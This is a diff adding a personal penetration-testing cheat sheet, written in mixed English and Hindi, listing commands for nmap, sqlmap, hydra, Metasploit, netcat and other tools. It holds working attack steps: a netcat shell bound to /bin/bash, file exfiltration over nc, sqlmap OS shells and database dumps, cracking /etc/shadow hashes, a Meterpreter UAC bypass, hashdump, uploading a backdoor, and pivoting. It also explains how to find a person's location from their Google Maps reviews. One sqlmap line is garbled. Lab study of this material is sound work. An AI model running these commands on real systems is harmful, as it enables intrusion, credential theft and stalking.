@@ -1,0 +1,391 @@
+Tools guide:
+
+basic cmd commands =>
+
+     ipconfig
+     net user => to check all username
+     net accounts => to check password policy
+NMAP:
+   nmap -sS -sC -sV -A IP -o nmap.txt
+   nmap -sS -sV --script vuln IP 
+   nmap -sC -sV -OA IP -o nmap.txt
+   nmap -sV --script=vulscan/vulscan.nse linuxhint.com
+   for finding nmap scripts:
+       ls -al /usr/share/nmap/scripts/ | grep -e "mysql"
+       
+       // mysql nmap scan
+           nmap -p 3306 --script mysql-info 10.10.10.229
+           nmap -p 3306 --script mysql-enum 10.10.10.229
+           
+      // smb (server message block)
+      
+      ls -al /usr/share/nmap/scripts/ | grep -e "smb"
+      
+      sudo nmap -p 445 --script smb-os-discovery 192.168.43.106                     // use for getting os information
+      sudo nmap -p 445 --script smb-enum-shares 192.168.43.106                      // getting info about different group members on the target
+      
+      sudo nmap -p 445 --script smb-protocols 192.168.43.106                       // complete info about smb service ,version ,protocol
+      
+      Vulnerability check on smb:
+      sudo nmap -p 445 --script smb-vuln-ms17-010 192.168.43.106                 // vulnerability and CVE check for smb service
+       
+       to enumerate all targets in a specific subnet , it is not required that you have assigned with an ip of that network => nmap -sn 172.16.37.0/24 
+       
+       Advance and speedy attack =>  Use this attack when no ports are open from port 1-1000 (common ports) => at last situation use this attack it will scan all ports
+       Use nmap with following options:
+
+       -sV for version identification
+
+       -n for disabling reverse DNS lookup
+
+       -v for Verbose
+
+       -Pn to assume host is alive
+
+       -p- to scan all the ports
+
+      -T4 to speed things up
+
+      -iL to use a list of IPs as input (ips.txt)
+
+      --open to see just open ports and not closed / filtered ones
+
+      -A for detailed information and running some scripts
+       nmap -sV -n -v -Pn -p- -T4 -iL ips.txt -A  --open
+
+      NMAP => remember while specifiying target you can make any octet * => means test for all posibilites of the target => 
+        simple ping attack to map the available IPs on the network => nmap -sn -n 192.168.43.*
+    
+Rustscan => if nmap works too slow => then use this tool for all port enumeration => rustscan -a target_ip_or_host --ulimit 5000  => after this launch nmap scan on specific ports   
+      
+gobuster:
+gobuster dir -u URL -w PATHOFWORDLIST
+gobuster dir -u URL -w PATHOFWORDLIST -x php,html,aspx,sh
+
+gobuster dir -u URL -w PATHOFWORDLIST -a Linux               // sometime it happens that server respond only the requests send by the linux or windows, you can find this in user-agent section on intercepted request in burp. so by -a we can change request to Linux only or Windows only
+
+curl tool:
+curl -XPOST http://165.232.41.211:30934/ -d "input_field=our_payload" 
+curl -d '{"name": "John", "age": 32}' -H "Content-Type: application/json" -X POST http://localhost:3000
+curl ‘http://localhost:3000/John'
+Brute Force:
+       hydra:
+       hydra -t 4 -L login.txt -P login.txt ssh://target_ip
+       medusa:
+       medusa -h 192.168.1.106 –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M mysql
+
+
+sqlmap:sudo systemctl enable --now snapd.socketsudo systemctl enable --now snapd.socketsudo systemctl enable --now snapd.socsudo systemctl enable --now snapd.socketket
+
+// for any help you can : cat /usr/sare/wfuzz/wordlist/Injections/SQL.txt
+
+// remember while using sqlmap use --cookie="" if there is any cookie , put complete url , no need of ?id=1 if there is any or many parameter in the url , in case of GET request remeber put the enire url from GET header in burp suite, in case of POST request use --data
+
+sqlmap -u "http://192.168.43.136/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=high; PHPSESSID=39da6fdbbff804971ca5aedc33c6d199" --dbs
+ for advance attack we can specify that level is 5 and risk is 3 , means we are trying all possible methods
+ the verp first command to check => 
+sqlmap -u URL --tables
+sqlmap -r req.txt --current-db
+sqlmap -r req.txt --dump  // best command ever
+sqlmap -r reqest_from_burp.req --dbms mysql --technique=U --users --batch
+sqlmap -r reqest_from_burp.req --dbms mysql --technique=U --passwords --batch
+sqlmap -r reqest_from_burp.req --dbms mysql --technique=U --help
+sqlmap -r reqest_from_burp.req --dbms mysql --technique=U --dump --batch
+bina --batch ke kroge toh kuch questions bhi puchega
+sqlmap -r login.req --level 5 --risk 3 --threads 20 --tables              // if this is not work use threads 10 or lesser
+sqlmap -r login.req --level 5 --risk 3 --tables
+sqlmap -r login.req --level 5 --risk 3 -T table_name --dump --threads 10
+
+for finding database:
+sqlmap -u URL -p vulnerable_parameter
+sqlmap -u URL --dbs           // find all available databases
+sqlmap -u URL --form --dbs --batch      // find all available databases
+sqlmap -u URL -D databasename --dump-all --batch
+sqlmap -u URL --D databasename --tables         //find all the available tables in databasename database
+sqlmap -u URL --D databasename -T table_name --columns
+sqlmap -u URL --D databasename -T table_name --dump           // puri table ko dump kr lega mat save kr dega
+
+for post strings =>
+sqlmap -u URL --data="post string"
+sqlmap -u URL --data="post string" -p parameter
+
+
+To get an OS shell via sqlmap => 
+     sqlmap -u http://10.10.10.10 --os-shell
+     
+*****NOTE : 1) agar sqlmap ko nahi bayenge ke kya data nikalana hai toh woh sirf yahi test krega ke site vulnerable hai ya nahi , issliye always specify --dbs or --tables or --users or --dump-all or --dump to get database name ,tables , all users or everything  
+            2) to find the payload used by sqlmap use => -v3 --fresh-queries => add this after command
+            3) to give name of known vulnerable parameter use => -p parameter_name
+            4) to specify a particular attack technique use => --technique=B or --technique=U
+            6) use --tamper=charencode to bypass WAF
+            5) sqlmap store data from previous attacks also , if we want to perform a fresh new attack on the target use => -v3 --flush-session
+****
+
+
+
+Xspear :
+XSpear -u "URL" -v 1
+
+Radare2: // mostly used with binaries
+it also give other tools for info :
+rabin2 -I binary_name
+rabin2 -S binary_name
+
+we can go inside the binary:
+r2 binary_name
+             aaa
+             V   // press and just use upper and lower arrow to move in different section of the encryption code or we can simpy usr mouse pad to scroll down..
+             
+             
+             
+Steghide:
+     steghide extract -sf /root/Downloads/image.jpg      // this is for extracting hidden files in the image....
+     
+     
+xxd:  it is not a tool just a binary for converting any file into hexadecimal text:
+xxd --plain file_name > hex.txt            // here file_name can be any type of file image , jpeg, png , audio ,wav , video mp4 anything: 
+
+kisi bhi extension ki ya kisi bhi type ka data file ho image, video audio kuch , uska hexadecimal text mein shuruat ke 8 char hamesha file data ke according varry krte hai for example:
+for file type     : shuruat ke 8char (also called a magic char)
+png               : 89504E47
+jpeg              : ffd8ffe0
+tar               : 75737461
+elf (executable)  : 7f454c46
+and many more can be findout on : https://gist.github.com/leommoore/f9e57ba2aa4bf197ebc5
+
+now if a have hex.txt means hexadecimal data of a datafile then we convert hex.txt to the original datafile using cyber chef , 
+input is hex.txt , and from hex to Render image(or the datatypeof thefile)
+
+Evil-Winrm: This program can be used on any Microsoft Windows Servers with this feature enabled (usually at port 5985), of course only if you have credentials and permissions to use it. So we can say that it could be used in a post-exploitation hacking/pentesting phase. 
+       Syntax: evil-winrm -i <Windows IP> -u <username> -p <’password’>
+       example:
+             evil-winrm -i 192.168.1.105 -u administrator -p 'Ignite@987'
+             
+WORDPRESS SCANNER (wpscan):
+       for enumerating usernames:
+       wpscan --url http://10.10.10.229/main -e u vp
+       for bruteforce the password on all users: 
+       wpscan --url http://10.10.10.229/main -e u --passwords /usr/share/wordlists/rockyou.txt
+       
+       
+CEWL for creating Password list from the webpage:
+      cewl -d5 -m3 -w wordlist http://fuse.fabricorp.local/papercut/logs/html/index.html --with-numbers
+      
+      
+DNS Enumeration(host,dig,nslookup):
+          // host
+       for finding the public ip of the domain where site is acutally host:
+        host www.hsploit.com
+         host -t ns hsploit.com                // will give info about name servers
+         host -t mx hsploit.com                // will give info about the mail servers site is using 
+         // nslookup
+         same job as host tool
+         nslookup hsploit.com
+         
+         nslookup interactive:
+         nslookup 
+         > set type=ns 
+         > hsploit.com
+         output: will be complete info ip,name of nameservers
+         other commands:
+         nslookup -type=txt secure-startup.com
+         nslookup -type=txt _dmarc.secure-startup.com
+         
+         for securing emails and Preventing email spoofing , companies implement SPF,DKIM and DMARC record on their mail server, we can detect all three record using nslookup
+         
+         
+         
+         Record |    Windows Command Line    |         Mac OS Terminal
+-------|----------------------------|-----------------------------------
+SPF    |nslookup  -type=txt domain  |dig txt domain
+-------|----------------------------|----------------------------------- 
+DKIM   |>nslookup                   |dig txt selector._domainkey.domain
+       |>set q=txt                  |
+       |>selector._domainkey.domain |
+-------|----------------------------|----------------------------------- 
+DMARC  |nslookup -type=txt          |dig txt _dmarc.domain
+       | _dmarc.domain              |
+-------|----------------------------|-----------------------------------
+ 
+       
+arpspoof => 
+    To enable IP forwarding in linux => echo 1 > /proc/sys/net/ipv4/ip_forward
+    arpspoof -i <interface> -t target -r <host> => to intecept the traffic between target and host = > all traffic which is intended for target or going to target , host is a client machine and target is a server => we can see the traffic in the wireshark set to interface
+ 
+        
+Dirb => 
+
+     dirb target wordlist_path
+     dirb target
+     if site ask for the creds => dirb http://172.16.64.140/project -u username:password
+     to fix the useragent value => dirb target -a "User-agent-you-can-find-all-useragents-on-useragentstrings.com"
+     to fix the cookie value => dirb target -c "key:value,key:value"
+     to fix an header => dirb target -H "Header: value"
+     to fix number of requests => dirb target -z INTEGER_VALUE_MILLISECONDS_PAUSE_TO_SEND_NEXT_REQUEST
+     to fix file extensions => dirb target -X ".php,.xml,.bak,.html"    
+     to fix file extensions from the list of extensions saved in extensions.txt => dirb target -x extensions.txt 
+     to save oputput to a file => dirb target -o output.txt
+Reverse Engineering: 
+  strings filename
+  
+OSINT:
+  agar kisi kisi place ko visit kiya and ussein google map pe update kiya and review diya toh , hum usski location nikaal sakte hai from that review, for that:
+   google.contact.com par jakar uska email apne contact mein save kro , then google hangouts kholo new conversion ke liye usse naam ke saath search kro jaise  hi ,search suggestions mein uska number aaye then usse inspect kro ,  inspect krne par email ke nicche , div oid= bada sa integer milega , toh google.com/maps/contrib/bada sa number  search krne par , reviews mein click krke hum usski location nikaal sakte hai
+   
+amass tool:
+     help commands:
+         amass -h
+         amass enum -h
+amass intel -org -d paytm 
+for finding all subdomains:
+                amass enum -d paytm.com -o ./paytm.txt
+
+
+JOHN: 
+    john hash-file  wordlist-like-rockyou.txt
+    to crack password of linux user => first get hashses along with users => unshadow /etc/passwd /etc/shadow > hashesfile
+    then for with wordlist => josh -wordlist=/usr/share/john/password.lst hashesfile or simply => john hashfile
+    
+    to get all cracked passwords by john => cat /root/.john/john.pot 
+    or john --showes hashesfile
+    
+    
+XSS : 
+    XSpear -u url -v 2
+    go to notes-> tools-> XSStrike
+    python3 xsstrike.py -h
+    python3 xsstrike.py -u https://www.iso-group.com/ 
+    python3 xsstrike.py -u https://www.iso-group.com/ --params
+    python3 xsstrike.py -u https://www.iso-group.com/ --crawl                   // most imp attack
+    Parameter Bruteforce : tools -> brutexss-1
+    ###Usage(GET Method):
+
+COMMAND:  python2.7 brutexss.py
+METHOD:   g
+URL:      http://www.site.com/?parameter=value
+WORDLIST: wordlist.txt
+###Usage(POST method):
+
+COMMAND:   python2.7 brutexss.py
+METHOD:    p
+URL:       http://www.site.com/file.php
+POST DATA: parameter=value&parameter1=value1
+WORDLIST:  wordlist.txt
+
+GitDorker =>  python3 GitDorker.py -q teslamoters.com -d Dorks/small_dorks.txt -tf tf/TOKENSFILE -o teslamoters
+              to increase number of request [github rate limit bypass ] = > python3 GitDorker.py -q teslamoters.com -d Dorks/small_dorks.txt -tf tf/TOKENSFILE -o teslamoters -lb
+              
+
+FFUF = > very useful tool =>
+   Dir brute force and sending all successfull findings to burpsuite => 
+   ffuf -w wordlistpath.txt -u https://target.com/FUZZ -o output.txt -replay-proxy http://127.0.0.1:8080     //   where -replay-proxy is fixing burpsuite port or use -X instead of replay-proxy to send each and every request to burp
+   
+     if we have some cookies to put in each and every request we have to use -b "All Cookies" in the last of the command
+     
+s3scanner => s3scanner --threads 8 scan --buckets-file ./bucket-name.txt
+             $ s3scanner dump --bucket my-bucket-to-dump
+Netcat =>
+ 
+   for revershell listener => nc -nvlp port  
+   for revershell => nc ip port
+   for establishing TCP connection http = > nc -v www.example.com
+   suppose we want to create a shell of 192.168.43.2 on 192.168.43.3 for this => listener on 192.168.43.2 is => nc -lvp 1234 -e /bin/bash => and command to put on 192.168.43.3 is => nc 192.168.43.2 1234 => after connection done any input given on 192.168.43.3 will execute on 192.168.43.2 and show result on 192.168.43.3
+   
+   File transfer using netcat => suppose we want to send file.txt from 192.168.43.3 to 192.168.43.2 for this => on 192.168.43.2 => nc -nvlp 1234 > file.txt => and on 192.168.43.3 => cat file.txt | nc 192.168.43.2 234
+openssl => 
+    Note => nc can only work with HTTP while openssl is also work with https , means nc can not establish connection with 443 but openssl can
+    openssl s_client -connect hack.me:443
+    openssl s_client -connect hack.me:443 -state
+curl => to print only status code of a url => curl -L --write-out "%{http_code}\n" --output /dev/null --silent --insecure http://google.com
+fping => by this we can find all alive IP in a following ip range or CIDR => network mapping
+fping -a -g 192.168.43.0/24
+fping -a -g 192.168.43.0 192.168.43.25 2> /dev/null
+
+Wordcounter =>
+   to get content length of the shell => wc -m shell.php
+   to get number of lines in file.txt => cat file.txt | wc -l
+   
+Windows attack =>  NULL Session attack => vulnerable ports are => 135,139,445 => search for the victim => nmap -sS -p 135,139,445 192.168.43.0-255 =>
+
+  1)    in windows we nbstat to get info about shares on a remote windows machine , in linux we can use nmblookup for the very same task =>
+  **       nmblookup -A TARGET_IP_WINDOWS_MACHINE  => this will give info about that shares are active or not => if <20> is there in the result then shares are active otherwise no sharing of resources is there on the machine
+  
+   if from nmblookup result shows that shares are active then use smbclient to get shares name as belows => 
+     
+      
+    2)   smbclient -L //10.130.40.34  -N => in the results all are shares , the one who have $ sign in last are system shares , while rest are the shares created by the users
+      this will give you all active sharenames , you can connect to this if there is no credentials set => suppose there is IPC$ present to connect to it use => NET USE \\10.130.40.34\IPC$ " /u: "  
+        
+        connecting to a share when machine is vulnerable for null session attack => smbclient \\\\target_ip\\share_name -N  = > this will give an smb shell => help for commands => common commands are => ls , cd ,dir , pwd , get for downloading files 
+        
+        more info about smbclient use => is here => https://bestestredteam.com/2019/03/15/using-smbclient-to-enumerate-shares/
+        
+        if you are using windows for hacking => use enum tool in command prompt , for null session attack => for linux use enum4linux tool => will give same result
+        
+        starting =>
+        enum4linux -n TARGET_IP => it will give many information => one of them is windows file shares are active or not => if <20> is present in the list then windows shares are active
+        enum4linux -S TARGET_IP => will give name of available shares
+        enum4linux -U TARGET_IP => list out all users of windows machine 
+        enum4linux -P TARGET_IP => it wil give password policy of the target
+        suppose we are not getting shares name then we can also find this by brute force attack => enum4linux -s /usr/share/enum4linux/share-list.txt TARGET_IP
+          
+          suppose we forget all enum4linux command or we want to apply available options then we can do this by =>
+          enum4linux -a TARGET_IP
+          nmap -script=smb-enum-shares TARGET_IP  => if in the results at least one of share have any type of anonymous access like READ or WRITE then it is vulnerable for null sessions attack.
+          nmap -script=smb-enum-users TARGET_IP  => give info about users and their password policy
+          nmap -script=smb-brute TARGET_IP   => it will do brute force for all users and give username:password if found
+          for finding vulnerabilities in windows using nmap => nmap --script smb-check-vulns.nse --script-args=unsafe=1 TARGET_IP
+          
+          
+          Windows hacking and null session attacks with impacket => in my lappy it is at => /opt/impacket/examples
+          complete detail is available at => https://www.hackingarticles.in/impacket-guide-smb-msrpc/
+          here we will use samrdump.py => cd /opt/impacket/examples with no creds => python3 samrdump.py TARGET_IP => if we have the creds then we can login directly check above mention link for the syntax and other tools
+          
+          
+                    
+Metasploit => best scan for metasploit => nmap -sV target_ip => give only services name => because metasploit exploit only them
+   suppose we get an meterpreter session => to put the session in the background => background => to list out the running session => sessions -l => to select session number 1 => session -i 1
+   
+   => for pivoting with metasploit => https://www.youtube.com/watch?v=t5o75OzBHaQ => best solution
+   
+   => suppose after an exploit we don't get an meterpreter shell => all we get a spwan shell => so upgrade it to meterpreter shell => sessions -u SESSION_NUMBER
+    in meterprete shell => https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/ => 
+     to get info of the target => sysinfo
+     to get which user is executing command => getuid
+     to search for a particular file => search -f file_name.txt
+     to escalate the privileges to highest => getsystem
+     sometimes getsystem does not work because of USER ACCESS CONTROL policy =>to check UAC => run post/windows/gather/win_privs =>  to bypass UAC =>
+      use bypassuac module => give command =>  background => or simply (ctrl+z) for going into background => search bypassuac => then use the exploit => show options => set the session  => exploit => it will bypass the UAC and disable it =>
+      now getsystem will work correctly
+      => to steal the password hashes of a windows machine => use hashdump => search hashdump => use it => set session => exploit OR => in a meterpreter just type hashdump = > it will list all hashes copy and save it
+      
+      we can also migrate from one process id to another => to list out all system admin process => ps -U SYSTEM => select any one of them note the pid => migrate pid => migration is done now => to confirm => getpid => it should same as the pid we selected from the list
+      
+      To download file from windows machine => download filename /root/
+      To upload file from attacker machine to windows => upload /root/backdoor.exe C:\\Windows  => remember \\ for bypassing \ restriction
+      
+      Pivoting =>technique 1) => suppose we have session on machine with ip => 172.164.99.24 , and on ifconfig you findout that there is one more subnet 172.164.43.0/24 connected to 172.164.99.0/24 => but you can not scan that subnet directly from your network you have to do all scan from 172.164.99.24 => if you want to do all scan from your machine so you can use all your metasploit tools => for this you can add an route to meterpreter session of 172.164.99.24 => by this whatever scan you do for 172.168.43.0/24 using metasploit all will happen via 172.164.99.24
+      = > to do this first open meterpreter session of 172.164.99.24 => 
+      and do this command => run autoroute -s 172.164.43.0/24 = > this will add an route => to list out all available route use => run autoroute -p 
+      
+      technique 2) => suppose autoroute does not adding the route then you can also use route command of msf => for this => backgroud the session by => background => session -l => to check the session number => then => route add 172.164.43.0 255.255.255.0 SESSION_NUMBER => this will add an route means whatever the scan launch by metasploit for 172.164.43.0/24 will go via session SESSION_NUMBER . => to listout all route => route print 
+    
+    technique 3) => doing port forwarding via meterpreter => https://medium.com/swlh/metasploit-pivoting-281636b23279
+    
+sshuttle = > this tool is for pivoting via ssh ( only use when you have an ssh credentials of a machine of internal network for which you want to make a scan )
+    => suppose you are ip is 172.168.99.24 and you have ssh credentials of a machine 172.168.43.2 which is connected to you via openvpn => and you 172.168.43.2 is have connection with a subnet 172.168.55.0/24 , now you want to make a scan for this subnet but you are not connected with it . so for this you can use 172.168.43.2 as a proxy between you and 172.168.55.0/24 => whatever scan you launch for 172.168.55.0/24 => all packets will send to that subnet via 172.168.43.2
+    
+     to do this => sshuttle -r machinehost_name@172.168.43.2 172.168.55.0/24 
+     it will ask for the password of your machine
+     then it will ask ssh password for 172.168.43.2 
+     connection will esatablish and you can scan from your terminal
+    
+      
+Nessus => 
+   to start nessus servie => service nessusd start => after this visit => https://127.0.0.1:8834/ => to access the nessus web
+   
+mysql commands => 
+   to connect to a mysql server remotely => mysql -u USERNAME -pPASSWORD -h HOST DB => here host is IP address or dns name
+   suppose mysql is not connecting then may be it is not running on default port , in that case specify the port with -P port =>
+   mysql -u USERNAME -p -P PORT -h HOST => mentioning DB does not requeired => if not connecting then mention the DB in the last
+     after establishing the connections => show tables; => desc table_name => select * from table_name
